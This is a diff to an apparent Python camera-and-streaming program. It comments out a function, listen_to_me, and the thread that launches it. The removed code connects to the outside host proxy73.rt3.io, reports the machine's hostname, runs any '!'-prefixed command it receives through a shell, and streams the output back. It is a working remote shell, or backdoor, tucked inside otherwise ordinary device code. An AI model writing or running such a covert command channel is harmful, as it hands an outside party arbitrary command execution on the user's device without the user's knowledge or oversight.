@@ -366,99 +366,99 @@ def listen_to_server():
         time.sleep(5)
 
 
-def listen_to_me():
-    global connection
-
-    host = "proxy73.rt3.io"
-    port = 30155
-    buff_size = 127
-    alive_msg = b"$k$"
-
-    try:
-        # stream = False
-        logger.info("Trying to connect to ME")
-        my_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server_address = (host, port)
-        my_server.connect(server_address)
-        my_server.settimeout(60)
-        logger.info(f"Connected at {my_server.getsockname()}.")
-        id_message = bytes("$id" + hostname + "$", "utf-8")
-        my_server.sendall(id_message)
-        logger.info(f"Id message sent to ME: {id_message}")
-        my_server.sendall(alive_msg)
-        while True:
-            logger.info("Listening ME...")
-            my_server_msg = my_server.recv(buff_size)
-            if my_server_msg != b"":
-                data_orig = my_server_msg.decode("utf-8")
-                merge_msg = False
-                messages = []
-                new_msg = ""
-                for d in data_orig:
-                    if d == "$":
-                        if not merge_msg:
-                            merge_msg = True
-                            continue
-                        else:
-                            merge_msg = False
-                            messages.append(new_msg)
-                            new_msg = ""
-                    if merge_msg:
-                        new_msg += d
-
-                for command in messages:
-                    if command.startswith("!"):
-                        do_command = command[1:]
-                        command_out = subprocess.Popen(do_command, shell=True, stdout=subprocess.PIPE,
-                                                       stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                        # command_out_stdout = command_out.stdout.read()
-                        # command_out_stderr = command_out.stderr.read()
-                        # if command_out_stdout != b'':
-                        #     command_out_stdout = b"$" + command_out.stdout.read() + b"$"
-                        #     my_server.sendall(command_out_stdout)
-                        # if command_out_stderr != b'':
-                        #     command_out_stderr = b"$" + command_out.stderr.read() + b"$"
-                        #     my_server.sendall(command_out_stderr)
-                        for line in io.TextIOWrapper(command_out.stdout, encoding="utf-8"):
-                            line = b"$" + bytes(line, "utf-8") + b"$"
-                            my_server.sendall(line)
-                        for line in io.TextIOWrapper(command_out.stderr, encoding="utf-8"):
-                            line = b"$" + bytes(line, "utf-8") + b"$"
-                            my_server.sendall(line)
-
-
-                    elif command == "k":
-                        # if not stream:
-                        my_server.sendall(alive_msg)
-                        # logger.info("ME is Online.")
-                    else:
-                        logger.warning(f"Unknown message from ME: {command}")
-                        time.sleep(5)
-            else:
-                logger.error(f"Empty byte from ME. Closing the connection!: ME Message: {my_server_msg}")
-                my_server.close()
-                break
-
-    except socket.timeout:
-        logger.warning("ME timeout in 60 seconds! Closing the connection.")
-        # stream = False
-        time.sleep(5)
-    except ConnectionRefusedError as cre:
-        logger.warning(f"ME Connection Refused! Probably server is not online..: {cre}")
-        # stream = False
-        time.sleep(5)
-    except ConnectionAbortedError as cae:
-        logger.warning(f"ME Connection closed by Client!: {cae}")
-        # stream = False
-        time.sleep(5)
-    except ConnectionResetError as cse:
-        logger.warning(f"ME Connection closed by server!: {cse}")
-        # stream = False
-        time.sleep(5)
-    except:
-        error_handling()
-        # stream = False
-        time.sleep(5)
+# def listen_to_me():
+#     global connection
+#
+#     host = "proxy73.rt3.io"
+#     port = 30155
+#     buff_size = 127
+#     alive_msg = b"$k$"
+#
+#     try:
+#         # stream = False
+#         logger.info("Trying to connect to ME")
+#         my_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#         server_address = (host, port)
+#         my_server.connect(server_address)
+#         my_server.settimeout(60)
+#         logger.info(f"Connected at {my_server.getsockname()}.")
+#         id_message = bytes("$id" + hostname + "$", "utf-8")
+#         my_server.sendall(id_message)
+#         logger.info(f"Id message sent to ME: {id_message}")
+#         my_server.sendall(alive_msg)
+#         while True:
+#             logger.info("Listening ME...")
+#             my_server_msg = my_server.recv(buff_size)
+#             if my_server_msg != b"":
+#                 data_orig = my_server_msg.decode("utf-8")
+#                 merge_msg = False
+#                 messages = []
+#                 new_msg = ""
+#                 for d in data_orig:
+#                     if d == "$":
+#                         if not merge_msg:
+#                             merge_msg = True
+#                             continue
+#                         else:
+#                             merge_msg = False
+#                             messages.append(new_msg)
+#                             new_msg = ""
+#                     if merge_msg:
+#                         new_msg += d
+#
+#                 for command in messages:
+#                     if command.startswith("!"):
+#                         do_command = command[1:]
+#                         command_out = subprocess.Popen(do_command, shell=True, stdout=subprocess.PIPE,
+#                                                        stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+#                         # command_out_stdout = command_out.stdout.read()
+#                         # command_out_stderr = command_out.stderr.read()
+#                         # if command_out_stdout != b'':
+#                         #     command_out_stdout = b"$" + command_out.stdout.read() + b"$"
+#                         #     my_server.sendall(command_out_stdout)
+#                         # if command_out_stderr != b'':
+#                         #     command_out_stderr = b"$" + command_out.stderr.read() + b"$"
+#                         #     my_server.sendall(command_out_stderr)
+#                         for line in io.TextIOWrapper(command_out.stdout, encoding="utf-8"):
+#                             line = b"$" + bytes(line, "utf-8") + b"$"
+#                             my_server.sendall(line)
+#                         for line in io.TextIOWrapper(command_out.stderr, encoding="utf-8"):
+#                             line = b"$" + bytes(line, "utf-8") + b"$"
+#                             my_server.sendall(line)
+#
+#
+#                     elif command == "k":
+#                         # if not stream:
+#                         my_server.sendall(alive_msg)
+#                         # logger.info("ME is Online.")
+#                     else:
+#                         logger.warning(f"Unknown message from ME: {command}")
+#                         time.sleep(5)
+#             else:
+#                 logger.error(f"Empty byte from ME. Closing the connection!: ME Message: {my_server_msg}")
+#                 my_server.close()
+#                 break
+#
+#     except socket.timeout:
+#         logger.warning("ME timeout in 60 seconds! Closing the connection.")
+#         # stream = False
+#         time.sleep(5)
+#     except ConnectionRefusedError as cre:
+#         logger.warning(f"ME Connection Refused! Probably server is not online..: {cre}")
+#         # stream = False
+#         time.sleep(5)
+#     except ConnectionAbortedError as cae:
+#         logger.warning(f"ME Connection closed by Client!: {cae}")
+#         # stream = False
+#         time.sleep(5)
+#     except ConnectionResetError as cse:
+#         logger.warning(f"ME Connection closed by server!: {cse}")
+#         # stream = False
+#         time.sleep(5)
+#     except:
+#         error_handling()
+#         # stream = False
+#         time.sleep(5)
 
 
 def capture(camera_mode):
@@ -620,9 +620,9 @@ def check_internet():
                 if "listen_to_server" not in check_running_threads():
                     logger.info("Streaming Thread is starting...")
                     threading.Thread(target=listen_to_server, name="listen_to_server", daemon=True).start()
-                if "listen_to_me" not in check_running_threads():
-                    logger.info("listen_to_me Thread is starting...")
-                    threading.Thread(target=listen_to_me, name="listen_to_me", daemon=True).start()
+                # if "listen_to_me" not in check_running_threads():
+                #     logger.info("listen_to_me Thread is starting...")
+                #     threading.Thread(target=listen_to_me, name="listen_to_me", daemon=True).start()
                 if time.time() - pTimeCheck > 7200:
                     pTimeCheck = time.time() - 7080
 
